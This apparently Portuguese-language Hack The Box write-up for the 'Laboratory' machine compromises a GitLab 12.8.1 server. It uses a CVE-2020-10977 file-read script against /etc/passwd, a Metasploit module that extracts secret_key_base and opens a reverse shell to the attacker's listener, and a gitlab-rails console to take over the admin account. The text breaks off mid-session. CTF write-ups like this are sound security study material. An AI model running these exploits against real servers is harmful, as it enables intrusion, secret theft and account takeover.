&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.216                                                                   
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-18 15:50 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.216
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: The Laboratory
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;33.96 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após execução notamos que existem, além do serviço de SSH, dois serviços HTTP (HTTP e HTTPs em suas respectivas portas padrão) que fazem menção às entradas de DNS &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;laboratory.htb&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git.laboratory.htb&lt;/code&gt;, os quais foram incluidos no arquivo hosts da máquina para melhor enumeração destes serviços.&lt;/p&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Uma vez acessado serviço HTTP tanto no IP quanto em qualquer um dos DNS que pudemos observar de acordo com o scan do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, ocorre um redirecionamento para o HTTPS, que funciona na porta 443/TCP, que será discutido a seguir.&lt;/p&gt;

&lt;h3 id=&quot;443tcp---serviço-https&quot;&gt;443/TCP - Serviço HTTPS&lt;/h3&gt;

&lt;p&gt;Ao enumerar os serviços HTTPS em ambos os DNS, pudemos notar algumas diferenças nos serviços publicados.&lt;/p&gt;

&lt;h3 id=&quot;httpslaboratoryhtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://laboratory.htb&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Ao navegar para a página &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://laboratory.htb&lt;/code&gt;, temos um site institucional relacionado a uma empresa de segurança com Dexter, Dee Dee e Anonymous como funcionários, porém nenhum link interessante para dar continuidade na exploração.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Fowr3Hn.png&quot; alt=&quot;laboratory htb&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h4&gt;

&lt;p&gt;Para verificar se alguma outra página existe neste website, realizei o scan utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; porém nada interessante foi encontrado.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://laboratory.htb &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; html,php,txt &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            https://laboratory.htb
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     html,php,txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/18 16:12:44 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/images &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/assets &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/CREDITS.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 38301 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;17.37%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;httpsgitlaboratoryhtb&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://git.laboratory.htb&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Uma vez acessado o serviço, notado que se tratava de um servidor &lt;a href=&quot;https://about.gitlab.com/&quot;&gt;GitLab&lt;/a&gt;, conforme podemos ver na imagem abaixo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dL6VMKv.png&quot; alt=&quot;gitab laboratory htb&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; https://git.laboratory.htb/api/v3/internal/check &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;                                               
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;API V3 is no longer supported. Use API V4 instead.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                           
                                                                    
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; https://git.laboratory.htb/api/v4/internal/check &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt;                                               
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;401 Unauthorized&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (&lt;em&gt;laboratory.htb&lt;/em&gt;) mas que mesmo assim foi criada com sucesso.&lt;/p&gt;

&lt;p&gt;Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado &lt;strong&gt;SecureWebSite&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2FARHEv.png&quot; alt=&quot;gitlab projects&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ao navegar no repositório, pude notar de que se tratava do site publicado na URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://laboratory.htb&lt;/code&gt;, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.&lt;/p&gt;

&lt;p&gt;Entretanto, uma vez logado no portal, ao acessar o menu &lt;em&gt;Help &amp;gt; Help&lt;/em&gt; podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ygc0H7j.png&quot; alt=&quot;gitlab version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscando no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; encontradas algumas vulnerabilidades que poderiam ser exploradas, identificadas como &lt;strong&gt;Arbitrary File Read&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit gitlab
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                         |  Path
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
GitLab - &lt;span class=&quot;s1&quot;&gt;'impersonate'&lt;/span&gt; Feature Privilege Escalation                    | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | ruby/webapps/49334.py
Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py
GitLab 11.4.7 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  | ruby/webapps/49263.py
GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh
Gitlab-shell - Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                             | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - &lt;span class=&quot;s1&quot;&gt;'repository'&lt;/span&gt; Remote Command Execution        | json/webapps/47420.txt
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após algumas tentativas com os scripts do searchsploit não obtive o sucesso esperado. Em nova busca acabei encontrando o &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10977&quot;&gt;CVE-2020-10977 no MITRE&lt;/a&gt; que está relacionado à esta vulnerabilidade e, a partir desta informação, encontrei outros exploits a serem testados, sendo o disponível no repositório &lt;a href=&quot;https://github.com/thewhiteh4t/cve-2020-10977&quot;&gt;thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com)&lt;/a&gt; o utilizado.&lt;/p&gt;

&lt;p&gt;Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                   
&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;                                                                       
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; CVE-2020-10977 &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;       
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; GitLab Arbitrary File Read &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;               
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 12.9.0 &amp;amp; Below &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;    
&lt;span class=&quot;nt&quot;&gt;----------------------------------&lt;/span&gt;                                                                       
                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Found By : vakzz       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://hackerone.com/reports/827052 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; PoC By   : thewhiteh4t &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; https://twitter.com/thewhiteh4t      &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Target        : https://git.laboratory.htb                                                           
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Username      : dummy                                                                                
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password      : P@ssw0rd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Project Names : ProjectOne, ProjectTwo

&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Trying to Login...         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login Successful!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectOne...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectOne Created Successfully!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating ProjectTwo...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] ProjectTwo Created Successfully!
&lt;span class=&quot;o&quot;&gt;[&amp;gt;]&lt;/span&gt; Absolute Path to File : /etc/passwd
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Creating an Issue...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Created Successfully!
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Moving Issue...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Issue Moved Successfully!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Verificando o conteúdo do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; podemos notar que os usuários desta máquina, além de &lt;em&gt;root&lt;/em&gt; e &lt;em&gt;ssh&lt;/em&gt; foram criados e utilizam basicamente a mesma raiz de diretório em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/opt/gitlab&lt;/code&gt;, onde vamos buscar por arquivos interessantes&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;etc_passwd | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;sh | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $6&quot;,&quot;$1}'&lt;/span&gt;
/root,root
/var/run/sshd,sshd
/var/opt/gitlab,git
/var/opt/gitlab/postgresql,gitlab-psql
/var/opt/gitlab/mattermost,mattermost
/var/opt/gitlab/registry,registry
/var/opt/gitlab/prometheus,gitlab-prometheus
/var/opt/gitlab/consul,gitlab-consul
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arbitrários, pesquisei sobre como converter essa possibilidade em RCE, para assim obter um shell reverso. Após algumas leituras encontrei &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/&quot;&gt;um módulo do Metasploit&lt;/a&gt; que se utiliza desta mesma vulnerabilidade para obter o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key_base&lt;/code&gt; do GitLab, e assim, com uma chamada de deserialization do cookie emitido, obter um shell reverso com a conta &lt;strong&gt;git&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;multi/http/gitlab_file_read_rce&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.10.10:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing automatic check &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disable AutoCheck to override&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;to user jdoe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Created issue /jdoe/vWL4JJIQ/issues/1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing arbitrary file load
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File saved as: &lt;span class=&quot;s1&quot;&gt;'/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to delete project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleted project /jdoe/vWL4JJIQ
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to delete project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleted project /jdoe/NVfFvw3v
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command shell session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.10:4444 -&amp;gt; 10.10.10.216:35138&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-19 09:05:22 &lt;span class=&quot;nt&quot;&gt;-0300&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;998&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Com acesso à máquina iniciada enumeração utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; do &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md&quot;&gt;PEAS Suite&lt;/a&gt; que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Enumeração das contas, onde pudemos notar que o usuário &lt;strong&gt;dexter&lt;/strong&gt; (admin@example.com) é administrador.&lt;/li&gt;
  &lt;li&gt;Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Um dos pontos colocados pelo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@git:~/gitlab-rails&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gitlab-rails console
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
 GitLab:       12.8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;d18b43a5f5a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
Loading production environment &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Rails 6.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
irb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;main&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:001:0&amp;gt; user &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; User.find_by&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;email: &lt;span class=&quot;s2&quot;&gt;&quot;admin@example.com&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#&amp;lt;User id:1 @dexter&amp;gt;&lt;/span&gt;
